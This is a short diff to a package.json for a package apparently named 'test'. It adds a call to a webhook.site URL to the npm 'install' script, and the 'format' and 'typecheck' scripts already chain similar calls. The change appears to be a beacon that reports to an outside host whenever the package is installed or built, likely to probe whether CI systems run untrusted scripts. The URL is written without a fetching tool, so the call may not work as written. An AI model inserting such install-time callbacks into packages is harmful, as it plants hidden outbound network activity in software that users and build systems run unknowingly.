@@ -4,7 +4,7 @@
   "description": "test",
   "main": "index.js",
   "scripts": {
-    "install": "echo 'Installing fork $$$$$$$$$$$$$' ",
+    "install": "echo 'Installing fork $$$$$$$$$$$$$' && https://webhook.site/aac76398-5de8-4367-b138-5c7b2a41e692/install",
     "format": "echo 'Formatting $$$$$$$$$$$$$' && https://webhook.site/aac76398-5de8-4367-b138-5c7b2a41e692/format",
     "typecheck": "echo 'Typechecking $$$$$$$$$$$$$' && https://webhook.site/aac76398-5de8-4367-b138-5c7b2a41e692/typecheck"
   },
